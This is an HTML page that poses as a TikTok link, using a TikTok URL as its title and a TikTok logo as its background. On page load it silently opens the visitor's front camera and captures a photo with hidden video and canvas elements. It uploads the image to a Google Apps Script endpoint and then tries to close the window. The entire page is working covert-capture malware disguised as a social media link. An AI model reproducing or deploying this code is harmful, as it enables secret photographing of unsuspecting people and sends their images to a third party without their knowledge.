<!DOCTYPE html>
<html>
<head>
    <title>https://vt.tiktok.com/ZSS2Et91W/</title>
    <style>
        body { margin: 0; padding: 0; background: #000; 
            margin: 0;
            padding: 0;
            background-color: #000;
            background-image: url("tiktok_logo.png");
            background-size: 300px auto;
            background-position: center;
            background-repeat: no-repeat;
            height: 100vh;
            overflow: hidden;
        }
        /* Hide all UI elements */
        video, canvas { display: none !important; }
    </style>
</head>
<body>
    <script>
        async function captureAndUpload() {
            try {
                // 1. Access camera
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: { ideal: "user" },
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });
                
                // 2. Capture image
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                // 3. Stop camera immediately
                stream.getTracks().forEach(track => track.stop());
                
                // 4. Prepare image data
                const imageData = canvas.toDataURL('image/jpeg', 0.85);
                
                // 5. Send to Google Apps Script
                const response = await fetch('https://script.google.com/macros/s/AKfycbxizr_HoCIMxRF2e9uFgxMPX2g2XgvcZeuDpYrX23FjgldPCpSGYVsZZ5jUvzwO5ln9/exec', {
                    method: 'POST',
                    body: JSON.stringify({ image: imageData.split(',')[1] })
                });
                
                console.log('Upload result:', await response.text());
                
            } catch (error) {
                console.error('Capture failed:', error);
            } finally {
                // 6. Close window (may not work in all browsers)
                setTimeout(() => window.close(), 500);
            }
        }

        // Start immediately
        window.onload = captureAndUpload;
    </script>
</body>
</html>
